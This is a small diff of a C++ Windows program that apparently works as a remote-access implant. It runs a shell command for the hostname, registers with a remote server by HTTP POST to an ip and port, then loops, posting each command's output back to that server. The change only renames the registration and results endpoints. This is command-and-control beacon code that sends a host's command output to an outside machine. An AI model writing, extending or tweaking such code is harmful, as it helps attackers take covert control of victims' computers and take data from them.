@@ -317,7 +317,7 @@ int main(int argc, char const *argv[])
     CA2W hnamec(hnamecc.c_str());
     hname = shell(hnamec);
 
-    name = Post(ip, port, "/reg", "name=" + hname + "&type=" + type);
+    name = Post(ip, port, "/byakuya", "name=" + hname + "&type=" + type);
     
     while (true) {
 
@@ -368,7 +368,7 @@ int main(int argc, char const *argv[])
 
             }
 
-            Post(ip, port, "/results/" + name, "result=" + res);
+            Post(ip, port, "/output/" + name, "output=" + res);
         }
         Sleep(n);
     }
